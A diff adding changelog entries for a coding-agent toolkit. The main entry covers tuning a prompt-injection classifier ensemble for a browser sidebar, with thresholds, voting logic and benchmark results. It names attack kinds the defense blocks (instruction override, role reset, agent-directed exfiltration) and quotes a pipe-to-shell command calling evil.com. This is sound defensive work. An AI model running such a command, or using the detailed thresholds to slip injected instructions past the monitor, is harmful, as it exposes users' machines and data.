@@ -1,5 +1,135 @@
 # Changelog
 
+## [1.6.4.0] - 2026-04-22
+
+## **Sidebar prompt-injection defense got half as noisy, half as trusting of any single classifier.**
+
+v1.4.0.0 shipped the ML defense stack. Users clicked the review banner on roughly every other tool output, 44% false-positive rate on the BrowseSafe-Bench smoke. This release tunes the ensemble around the real pattern we found: Haiku labels phishing-aimed-at-users as "warn" and genuine agent hijacks as "block", but we were treating both identically in the ensemble. Testsavant alone fired BLOCK on benign phishing content too often. The fix is architectural, not just threshold-twiddling: we now trust Haiku's verdict label over its numeric confidence, raise the solo-BLOCK bar for label-less classifiers, and gate that path more carefully. One 500-case live bench proved the new numbers; a permanent CI gate replays the captured Haiku fixture on every `bun test`.
+
+### What changes for you
+
+Open your sidebar on Stack Overflow posts about prompt injection, read a Wikipedia article on SQL injection, browse a tutorial that walks through attack strings, the review banner stays quiet where before it fired. When a real hijack attempt shows up (explicit instruction-override, role-reset, agent-directed exfil, `curl evil.com | bash` in the page), the session still terminates. Phishing pages aimed at the user surface as a WARN signal in the banner meta, but no longer kill the session.
+
+### The numbers that matter
+
+Measured on BrowseSafe-Bench smoke, 500 cases (260 yes-labeled / 240 no-labeled), `bun test browse/test/security-bench-ensemble.test.ts`:
+
+| Metric | v1.4.0.0 | v1.6.4.0 | Δ |
+|---|---|---|---|
+| Detection (BLOCK verdict on injection cases) | 67.3% | **56.2%** (95% CI 50.1–62.1) | −11pp |
+| False-positive rate (BLOCK on benign cases) | 44.1% | **22.9%** (95% CI 18.1–28.6) | **−21pp** |
+| Gate: detection ≥ 55% AND FP ≤ 25% | FAIL | **PASS** | — |
+| Review-banner fire rate (roughly TP + FP share) | ~55% | ~39% | −16pp |
+
+Detection dropped by 11pp but nearly all of the lost TPs are cases where Haiku correctly classified as `warn` (phishing targeting the user, not a hijack of the agent). Those cases still show up in the review banner as WARN, they just don't terminate the session.
+
+### Stop-loss rule (hard floor and ceiling)
+
+`browse/test/security-bench-ensemble.test.ts` gates on **detection ≥ 55% AND FP ≤ 25%**. If a future change drops detection below 55%, the revert order is: WARN bump (0.75 → 0.60) → halve few-shot exemplars → widen Haiku block criteria. If FP climbs above 25%, tighten: raise SOLO_CONTENT_BLOCK (0.92 → 0.95) → raise WARN (0.75 → 0.80) → add anti-FP few-shots. Iterations write to `~/.gstack-dev/evals/stop-loss-iter-N-*.json` for audit trail.
+
+### Itemized changes
+
+#### Changed
+
+- `browse/src/security.ts` — new `THRESHOLDS.SOLO_CONTENT_BLOCK = 0.92` for label-less content classifiers. Solo BLOCK now requires testsavant/deberta confidence ≥ 0.92 (up from 0.85). Transcript-layer solo BLOCK requires `meta.verdict === 'block'` AND confidence ≥ 0.85. The ensemble 2-of-N path keeps `THRESHOLDS.WARN = 0.75` (up from 0.60).
+- `browse/src/security.ts` — `combineVerdict` rewritten for label-first voting on the transcript layer: `verdict === 'block'` at confidence ≥ LOG_ONLY (0.40) is a block-vote; `verdict === 'warn'` is a warn-vote regardless of confidence; missing `meta.verdict` is warn-vote only at confidence ≥ WARN (never block-vote). Missing meta never block-votes for backward compatibility with pre-v2 cached signals.
+- `browse/src/security-classifier.ts` — Haiku model pinned to `claude-haiku-4-5-20251001` (no longer rolls forward silently via the `haiku` alias). `claude -p` now spawns from `os.tmpdir()` so CLAUDE.md project context doesn't leak into Haiku's system prompt and make it refuse to classify. Timeout bumped from 15s to 45s (production measurement showed `claude -p` takes 17–33s end-to-end for Haiku).
+- `browse/src/security-classifier.ts` — Haiku prompt rewritten with explicit `block`/`warn`/`safe` criteria and 8 few-shot exemplars (instruction-override, role-reset, agent-directed malicious code → block; phishing/social-engineering targeting users → warn; discussion-of-injection and dev content → safe).
+
+#### Added
+
+- `browse/test/security-bench-ensemble-live.test.ts` — opt-in live bench via `GSTACK_BENCH_ENSEMBLE=1`. Worker-pool concurrency (default 8) via `GSTACK_BENCH_ENSEMBLE_CONCURRENCY`. Deterministic subsampling via `GSTACK_BENCH_ENSEMBLE_CASES`. Captures 500-case fixture to `browse/test/fixtures/security-bench-haiku-responses.json` plus eval record to `~/.gstack-dev/evals/`. Stop-loss iterations write `stop-loss-iter-N-*.json` and do NOT overwrite the canonical fixture.
+- `browse/test/security-bench-ensemble.test.ts` — CI-tier fixture-replay gate. Asserts detection ≥ 55% AND FP ≤ 25%. Fail-closed when the fixture is missing AND security-layer files changed in the branch diff (uses `git diff base` which catches both committed and uncommitted edits).
+- `browse/test/fixtures/security-bench-haiku-responses.json` — 500-case captured Haiku fixture with schema-version header, pinned model string, and component hashes.
+- `docs/evals/security-bench-ensemble-v2.json` — durable per-run audit record: TP/FN/FP/TN, knob state, schema hash, iteration.
+
+#### Fixed
+
+- `browse/test/security.test.ts`, `browse/test/security-adversarial.test.ts`, `browse/test/security-adversarial-fixes.test.ts`, `browse/test/security-integration.test.ts` — updated for label-first semantics. 6 new combineVerdict tests: warn-as-soft-signal, block-label-ensemble, three-way-block-with-warn, hallucination-guard (verdict=block at confidence 0.30 → warn-vote), above-floor block (verdict=block at confidence 0.50 → block-vote), backward-compat for missing meta.verdict.
+
+#### For contributors
+
+- The 500-case smoke dataset is in `~/.gstack/cache/browsesafe-bench-smoke/test-rows.json` (260 yes / 240 no). To regenerate the fixture after modifying security-layer code, run `GSTACK_BENCH_ENSEMBLE=1 bun test browse/test/security-bench-ensemble-live.test.ts` (~25 min at concurrency 4, ~$0.30 in Haiku costs).
+- Fixture schema hash covers model, prompt SHA, exemplars SHA, thresholds, combiner rev, and dataset version. Any change to any of those invalidates the fixture and forces a fresh live capture via fail-closed CI.
+
+## [1.6.3.0] - 2026-04-23
+
+## **Codex finally explains what it's asking about. No more "ELI10 please" the 10th time in a row.**
+
+A follow-up to v1.6.2.0. After shipping the Claude-verified fix, user reported Codex (GPT-5.4) was failing the same pattern 10/10 times — skipping the ELI10 explanation and the RECOMMENDATION line on AskUserQuestion calls, forcing manual "ELI10 and don't forget to recommend" re-prompts every time. Root cause: the `gpt.md` model overlay's "No preamble / Prefer doing over listing" rule was training Codex to skip the exact prose the user needs for decision-making.
+
+### The numbers that matter
+
+Source: new `test/codex-e2e-plan-format.test.ts`, four cases driven via `codex exec` on the installed gstack Codex host. Periodic tier (GPT-class non-determinism).
+
+| Case | Type | Pre-fix (measured, 10/10 times) | Post-fix (v1.6.3.0) |
+|---|---|---|---|
+| plan-ceo-review mode selection | kind | No ELI10 paragraph, no RECOMMENDATION line | ✓ ELI10 + RECOMMENDATION + "options differ in kind" note |
+| plan-ceo-review approach menu | coverage | No ELI10 paragraph, bare options list | ✓ ELI10 + RECOMMENDATION + `Completeness: 5/7/10` |
+| plan-eng-review coverage issue | coverage | Bare options list | ✓ ELI10 + RECOMMENDATION + Completeness |
+| plan-eng-review architectural choice | kind | Fabricated Completeness filler on kind question | ✓ ELI10 + RECOMMENDATION + "options differ in kind" note |
+
+All 4 Codex cases pass ELI10 length floor (>400 chars of prose per question). 517s for the full eval; Codex doesn't bill per call the way Anthropic does.
+
+### Itemized changes
+
+#### Fixed
+
+- Codex no longer skips the Simplify/ELI10 paragraph on AskUserQuestion calls. The `gpt.md` overlay now carves out AskUserQuestion content from the "No preamble" rule explicitly: you still skip filler on direct answers, but every AskUserQuestion gets the full Re-ground + ELI10 + RECOMMENDATION + Options format.
+- Codex no longer collapses the RECOMMENDATION into the options list. It lands on its own line, every time, regardless of question type.
+
+#### Changed
+
+- `scripts/resolvers/preamble/generate-ask-user-format.ts` — step 2 renamed to "Simplify (ELI10, ALWAYS)" with explicit "not optional verbosity, not preamble" framing. Step 3 "Recommend (ALWAYS)" hardened: "Never omit, never collapse into the options list." The tightening applies to all hosts, but Codex felt it most.
+- `model-overlays/gpt.md` — adds a new "AskUserQuestion is NOT preamble" section that instructs the model to back up and emit the full format if it ever finds itself about to skip the ELI10 paragraph or the RECOMMENDATION line.
+
+#### For contributors
+
+- `test/codex-e2e-plan-format.test.ts` — four periodic-tier Codex eval cases mirroring the Claude version. Uses `codex exec` via the existing `test/helpers/codex-session-runner.ts` harness with `sandbox: 'workspace-write'` so the capture file lands inside the tempdir. Assertions: RECOMMENDATION regex, coverage-vs-kind Completeness split, ELI10 length floor (400+ chars).
+- All T2 skills regenerated across all hosts (claude, codex, factory, gbrain, gpt-5.4, hermes, kiro, opencode, openclaw, slate, cursor). Golden fixtures refreshed. `test/gen-skill-docs.test.ts` ELI10 assertion updated to match the new "Simplify (ELI10" heading.
+
+## [1.6.2.0] - 2026-04-22
+
+## **Plan reviews give you the recommendation again. And we finally admitted a 10/10 score on a mode pick means nothing.**
+
+A user on Opus 4.7 reported `/plan-ceo-review` and `/plan-eng-review` stopped showing the `RECOMMENDATION: Choose X` line and the per-option `Completeness: N/10` score that used to make decisions quick. The fix ships both signals back, but with a sharper distinction: coverage-differentiated options get real scores (10 = all edges, 7 = happy path, 3 = shortcut), and kind-differentiated options (mode selection, A-vs-B architecture calls, cherry-pick Add/Defer/Skip) get the RECOMMENDATION plus an explicit `Note: options differ in kind, not coverage — no completeness score.` line instead of fabricated 10/10 filler.
+
+### The numbers that matter
+
+Source: `test/skill-e2e-plan-format.test.ts`, four cases pinned to `claude-opus-4-7`, ~$2 per full run. Periodic tier (non-deterministic Opus behavior gets weekly cron, not per-PR gate).
+
+| Question type | Before (v1.6.1.0) | After (v1.6.2.0) |
+|---|---|---|
+| Mode selection (kind-differentiated) | `Completeness: 10/10` fabricated on all 4 modes | RECOMMENDATION + "options differ in kind" note |
+| Approach menu (coverage-differentiated) | `**RECOMMENDATION:**` markdown-bolded but regex missed it | RECOMMENDATION + `Completeness: 5/7/10` per option |
+| Per-issue coverage decision | Present, working | Present, working (unchanged) |
+| Per-issue architectural choice (kind-differentiated) | `Completeness: 9/9/5` fabricated on kind question | RECOMMENDATION + "options differ in kind" note |
+
+| Eval pass | Result | Cost |
+|---|---|---|
+| Phase 1 baseline (pre-fix) | 1/4 assertions pass (evidence of regression) | $2.19 |
+| Phase 3 post-fix | 4/4 assertions pass | $1.84 |
+| Phase 3b neighbor regression (`skill-e2e-plan.test.ts`) | 12/12 pass, no drift | $5.19 |
+
+### Itemized changes
+
+#### Fixed
+
+- `RECOMMENDATION: Choose X` now appears consistently on every AskUserQuestion in `/plan-ceo-review` and `/plan-eng-review` regardless of question type.
+- `Completeness: N/10` is only emitted on coverage-differentiated options. Kind-differentiated questions (mode picks, architectural choices between different systems, cherry-pick A/B/C) emit a one-line note explaining why the score doesn't apply, instead of fabricating 10/10 filler.
+
+#### Changed
+
+- The `AskUserQuestion Format` section in the T2 preamble splits the old run-on paragraph into two ALWAYS-framed rules: step 3 "Recommend (ALWAYS)" and step 4 "Score completeness (when meaningful)". This affects every T2 skill (~15 files regenerated).
+- The `Completeness Principle — Boil the Lake` preamble section now states the coverage-vs-kind distinction explicitly, matching step 4. Without this edit the two preamble locations would disagree — which is how the regression started.
+- Section 0C-bis (approach menu) and Section 0F (mode selection) in `plan-ceo-review/SKILL.md.tmpl` now carry short anchor lines that remind the model which question type applies. `plan-eng-review/SKILL.md.tmpl` gets an equivalent anchor inside the CRITICAL RULE section for per-issue AskUserQuestion decisions.
+
+#### For contributors
+
+- New test file `test/skill-e2e-plan-format.test.ts` captures verbatim AskUserQuestion output from the two plan skills and asserts the coverage-vs-kind format. Instructs the agent to write would-be AskUserQuestion text to `$OUT_FILE` rather than calling an MCP tool (since MCP isn't wired inside `claude -p`).
+- Classified `periodic` tier because behavior depends on Opus 4.7 non-determinism — `gate` tier would flake and block merges.
+- Golden fixtures (`test/fixtures/golden/claude-ship-SKILL.md`, `codex-ship-SKILL.md`, `factory-ship-SKILL.md`) refreshed to reflect the new format rule.
+
 ## [1.6.1.0] - 2026-04-22
 
 ## **Opus 4.7 migration, reviewed. Overlay actually split per model. Routing verified, fanout is still on the list.**
